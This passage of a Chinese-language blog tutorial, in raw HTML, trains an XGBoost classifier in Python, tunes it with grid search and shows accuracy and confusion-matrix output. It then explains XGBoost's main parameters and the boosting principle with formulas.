class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score</span><br><span class="line"><span class="keyword">from</span> xgboost <span class="keyword">import</span> plot_importance</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">estimate</span>(<span class="params">model,data</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#sns.barplot(data.columns,model.feature_importances_)</span></span><br><span class="line">    ax1=plot_importance(model,importance_type=<span class="string">&quot;gain&quot;</span>)</span><br><span class="line">    ax1.set_title(<span class="string">&#x27;gain&#x27;</span>)</span><br><span class="line">    ax2=plot_importance(model, importance_type=<span class="string">&quot;weight&quot;</span>)</span><br><span class="line">    ax2.set_title(<span class="string">&#x27;weight&#x27;</span>)</span><br><span class="line">    ax3 = plot_importance(model, importance_type=<span class="string">&quot;cover&quot;</span>)</span><br><span class="line">    ax3.set_title(<span class="string">&#x27;cover&#x27;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">classes</span>(<span class="params">data,label,test</span>):</span></span><br><span class="line">    model=XGBClassifier()</span><br><span class="line">    model.fit(data,label)</span><br><span class="line">    ans=model.predict(test)</span><br><span class="line">    estimate(model, data)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"> </span><br><span class="line">ans=classes(x_train,y_train,x_test)</span><br><span class="line">pre=accuracy_score(y_test, ans)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;acc=&#x27;</span>,accuracy_score(y_test,ans))</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\xgboost\sklearn.py:1146: UserWarning: The use of label encoder in XGBClassifier is deprecated and will be removed in a future release. To remove this warning, do the following: 1) Pass option use_label_encoder=False when constructing XGBClassifier object; and 2) Encode your labels (y) as integers starting with 0, i.e. 0, 1, 2, ..., [num_class - 1].  warnings.warn(label_encoder_deprecation_msg, UserWarning)[15:25:51] WARNING: C:/Users/Administrator/workspace/xgboost-win64_release_1.4.0/src/learner.cc:1095: Starting in XGBoost 1.3.0, the default evaluation metric used with the objective 'binary:logistic' was changed from 'error' to 'logloss'. Explicitly set eval_metric if you'd like to restore the old behavior.</code></pre><p><img "" class="lazyload placeholder" data-original="output_35_2.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_35_3.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_35_4.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><pre><code>acc= 0.8575179333302076</code></pre><p>这些图同样可以帮助我们更好的了解其他重要特征。</p><p><strong>Step8: 通过调整参数获得更好的效果</strong></p><p>XGBoost 中包括但不限于下列对模型影响较大的参数：</p><ol><li>learning_rate: 有时也叫作 eta，系统默认值为 0.3。每一步迭代的步长，很重要。太大了运行准确率不高，太小了运行速度慢。</li><li>subsample：系统默认为 1。这个参数控制对于每棵树，随机采样的比例。减小这个参数的值，算法会更加保守，避免过拟合，取值范围零到一。</li><li>colsample_bytree：系统默认值为 1。我们一般设置成 0.8 左右。用来控制每棵随机采样的列数的占比 (每一列是一个特征)。</li><li>max_depth： 系统默认值为 6，我们常用 3-10 之间的数字。这个值为树的最大深度。这个值是用来控制过拟合的。max_depth 越大，模型学习的更加具体。</li></ol><p>调节模型参数的方法有贪心算法、网格调参、贝叶斯调参等。这里我们采用网格调参，它的基本思想是穷举搜索：在所有候选的参数选择中，通过循环遍历，尝试每一种可能性，表现最好的参数就是最终的结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 从sklearn库中导入网格调参函数</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> GridSearchCV</span><br><span class="line"></span><br><span class="line"><span class="comment">## 定义参数取值范围</span></span><br><span class="line">learning_rate = [<span class="number">0.1</span>, <span class="number">0.3</span>, <span class="number">0.6</span>]</span><br><span class="line">subsample = [<span class="number">0.8</span>, <span class="number">0.9</span>]</span><br><span class="line">colsample_bytree = [<span class="number">0.6</span>, <span class="number">0.8</span>]</span><br><span class="line">max_depth = [<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">parameters = &#123; <span class="string">&#x27;learning_rate&#x27;</span>: learning_rate,</span><br><span class="line">              <span class="string">&#x27;subsample&#x27;</span>: subsample,</span><br><span class="line">              <span class="string">&#x27;colsample_bytree&#x27;</span>:colsample_bytree,</span><br><span class="line">              <span class="string">&#x27;max_depth&#x27;</span>: max_depth&#125;</span><br><span class="line">model = XGBClassifier(n_estimators = <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 进行网格搜索</span></span><br><span class="line">clf = GridSearchCV(model, parameters, cv=<span class="number">3</span>, scoring=<span class="string">&#x27;accuracy&#x27;</span>,verbose=<span class="number">1</span>,n_jobs=-<span class="number">1</span>)</span><br><span class="line">clf = clf.fit(x_train, y_train)</span><br></pre></td></tr></table></figure><pre><code>Fitting 3 folds for each of 36 candidates, totalling 108 fitsc:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\xgboost\sklearn.py:1146: UserWarning: The use of label encoder in XGBClassifier is deprecated and will be removed in a future release. To remove this warning, do the following: 1) Pass option use_label_encoder=False when constructing XGBClassifier object; and 2) Encode your labels (y) as integers starting with 0, i.e. 0, 1, 2, ..., [num_class - 1].  warnings.warn(label_encoder_deprecation_msg, UserWarning)[15:28:20] WARNING: C:/Users/Administrator/workspace/xgboost-win64_release_1.4.0/src/learner.cc:1095: Starting in XGBoost 1.3.0, the default evaluation metric used with the objective 'binary:logistic' was changed from 'error' to 'logloss'. Explicitly set eval_metric if you'd like to restore the old behavior.</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 网格搜索后的最好参数为</span></span><br><span class="line"></span><br><span class="line">clf.best_params_</span><br></pre></td></tr></table></figure><pre><code>&#123;'colsample_bytree': 0.6, 'learning_rate': 0.1, 'max_depth': 8, 'subsample': 0.8&#125;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 在训练集和测试集上分布利用最好的模型参数进行预测</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 定义带参数的 XGBoost模型 </span></span><br><span class="line">clf = XGBClassifier(colsample_bytree = <span class="number">0.6</span>, learning_rate = <span class="number">0.3</span>, max_depth= <span class="number">8</span>, subsample = <span class="number">0.9</span>)</span><br><span class="line"><span class="comment"># 在训练集上训练XGBoost模型</span></span><br><span class="line">clf.fit(x_train, y_train)</span><br><span class="line"></span><br><span class="line">train_predict = clf.predict(x_train)</span><br><span class="line">test_predict = clf.predict(x_test)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 利用accuracy（准确度）【预测正确的样本数目占总预测样本数目的比例】评估模型效果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The accuracy of the Logistic Regression is:&#x27;</span>,metrics.accuracy_score(y_train,train_predict))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The accuracy of the Logistic Regression is:&#x27;</span>,metrics.accuracy_score(y_test,test_predict))</span><br><span class="line"></span><br><span class="line"><span class="comment">## 查看混淆矩阵 (预测值和真实值的各类情况统计矩阵)</span></span><br><span class="line">confusion_matrix_result = metrics.confusion_matrix(test_predict,y_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The confusion matrix result:\n&#x27;</span>,confusion_matrix_result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用热力图对于结果进行可视化</span></span><br><span class="line">plt.figure(figsize=(<span class="number">8</span>, <span class="number">6</span>))</span><br><span class="line">sns.heatmap(confusion_matrix_result, annot=<span class="literal">True</span>, cmap=<span class="string">&#x27;Blues&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Predicted labels&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;True labels&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>[15:28:36] WARNING: C:/Users/Administrator/workspace/xgboost-win64_release_1.4.0/src/learner.cc:1095: Starting in XGBoost 1.3.0, the default evaluation metric used with the objective 'binary:logistic' was changed from 'error' to 'logloss'. Explicitly set eval_metric if you'd like to restore the old behavior.The accuracy of the Logistic Regression is: 0.9434917658090606The accuracy of the Logistic Regression is: 0.8577992404707206The confusion matrix result: [[15639  2119] [  914  2657]]</code></pre><p><img "" class="lazyload placeholder" data-original="output_41_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p>原本有 2470 + 790 个错误，现在有 2112 + 939 个错误，带来了明显的正确率提升。</p><h2 id="24-重要知识点"><a class="markdownIt-Anchor" href="#24-重要知识点">#</a> 2.4 重要知识点</h2><h3 id="241-xgboost的重要参数"><a class="markdownIt-Anchor" href="#241-xgboost的重要参数">#</a> 2.4.1 XGBoost 的重要参数</h3><p>1.eta [默认 0.3]</p><p>通过为每一颗树增加权重，提高模型的鲁棒性。<br>典型值为 0.01-0.2。</p><p>2.min_child_weight [默认 1]</p><p>决定最小叶子节点样本权重和。<br>这个参数可以避免过拟合。当它的值较大时，可以避免模型学习到局部的特殊样本。<br>但是如果这个值过高，则会导致模型拟合不充分。</p><p>3.max_depth [默认 6]</p><p>这个值也是用来避免过拟合的。max_depth 越大，模型会学到更具体更局部的样本。<br>典型值：3-10</p><p>4.max_leaf_nodes</p><p>树上最大的节点或叶子的数量。<br>可以替代 max_depth 的作用。<br>这个参数的定义会导致忽略 max_depth 参数。</p><p>5.gamma [默认 0]</p><p>在节点分裂时，只有分裂后损失函数的值下降了，才会分裂这个节点。Gamma 指定了节点分裂所需的最小损失函数下降值。 这个参数的值越大，算法越保守。这个参数的值和损失函数息息相关。</p><p>6.max_delta_step [默认 0]</p><p>这参数限制每棵树权重改变的最大步长。如果这个参数的值为 0，那就意味着没有约束。如果它被赋予了某个正值，那么它会让这个算法更加保守。<br>但是当各类别的样本十分不平衡时，它对分类问题是很有帮助的。</p><p>7.subsample [默认 1]</p><p>这个参数控制对于每棵树，随机采样的比例。<br>减小这个参数的值，算法会更加保守，避免过拟合。但是，如果这个值设置得过小，它可能会导致欠拟合。<br>典型值：0.5-1</p><p>8.colsample_bytree [默认 1]</p><p>用来控制每棵随机采样的列数的占比 (每一列是一个特征)。<br>典型值：0.5-1</p><p>9.colsample_bylevel [默认 1]</p><p>用来控制树的每一级的每一次分裂，对列数的采样的占比。<br>subsample 参数和 colsample_bytree 参数可以起到相同的作用，一般用不到。</p><p>10.lambda [默认 1]</p><p>权重的 L2 正则化项。(和 Ridge regression 类似)。<br>这个参数是用来控制 XGBoost 的正则化部分的。虽然大部分数据科学家很少用到这个参数，但是这个参数在减少过拟合上还是可以挖掘出更多用处的。</p><p>11.alpha [默认 1]</p><p>权重的 L1 正则化项。(和 Lasso regression 类似)。<br>可以应用在很高维度的情况下，使得算法的速度更快。</p><p>12.scale_pos_weight [默认 1]</p><p>在各类别样本十分不平衡时，把这个参数设定为一个正值，可以使算法更快收敛。</p><h3 id="242-xgboost原理粗略讲解"><a class="markdownIt-Anchor" href="#242-xgboost原理粗略讲解">#</a> 2.4.2 XGBoost 原理粗略讲解</h3><p>XGBoost 底层实现了 GBDT 算法，并对 GBDT 算法做了一系列优化：</p><ol><li>对目标函数进行了泰勒展示的二阶展开，可以更加高效拟合误差。</li><li>提出了一种估计分裂点的算法加速 CART 树的构建过程，同时可以处理稀疏数据。</li><li>提出了一种树的并行策略加速迭代。</li><li>为模型的分布式算法进行了底层优化。</li></ol><p>XGBoost 是基于 CART 树的集成模型，它的思想是串联多个决策树模型共同进行决策。</p><p>那么如何串联呢？XGBoost 采用迭代预测误差的方法串联。举个通俗的例子，我们现在需要预测一辆车价值 3000 元。我们构建决策树 1 训练后预测为 2600 元，我们发现有 400 元的误差，那么决策树 2 的训练目标为 400 元，但决策树 2 的预测结果为 350 元，还存在 50 元的误差就交给第三棵树…… 以此类推，每一颗树用来估计之前所有树的误差，最后所有树预测结果的求和就是最终预测结果！</p><p>XGBoost 的基模型是 CART 回归树，它有两个特点：（1）CART 树，是一颗二叉树。（2）回归树，最后拟合结果是连续值。</p><p>XGBoost 模型可以表示为以下形式，我们约定<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mi>t</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f_t(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span> 表示前<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span></span></span></span> 颗树的和，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mi>t</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h_t(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span> 表示第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span></span></span></span> 颗决策树，模型定义如下：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>f</mi><mi>t</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><munderover><mo>∑</mo><mrow><mi>t</mi><mo>=</mo><mn>1</mn></mrow><mi>T</mi></munderover><msub><mi>h</mi><mi>t</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f_t(x) = \sum_{t=1}^{T}h_t(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0954490000000003em;vertical-align:-1.267113em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8283360000000002em;"><span style="top:-1.882887em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.267113em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></span></p><p>由于模型递归生成，第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span></span></span></span> 步的模型由第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mtext>−</mtext><mn>1</mn></mrow><annotation encoding="application/x-tex">t−1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">t</span><span class="mord">−</span><span class="mord">1</span></span></span></span> 步的模型形成，可以写成：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>f</mi><mi>t</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>f</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>+</mo><msub><mi>h</mi><mi>t</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f_t(x) = f_{t-1}(x) + h_t(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></span></p><p>每次需要加上的树<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mi>t</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h_t(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span> 是之前树求和的误差：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>r</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub><mo>=</mo><msub><mi>y</mi><mi>i</mi></msub><mo>−</mo><msub><mi>f</mi><mrow><mi>m</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">r_{t,i} = y_i - f_{m-1}(x_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>我们每一步只要拟合一颗输出为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>r</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">r_{t,i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span> 的 CART 树加到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f_{t-1}(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">−</span><span class="mord 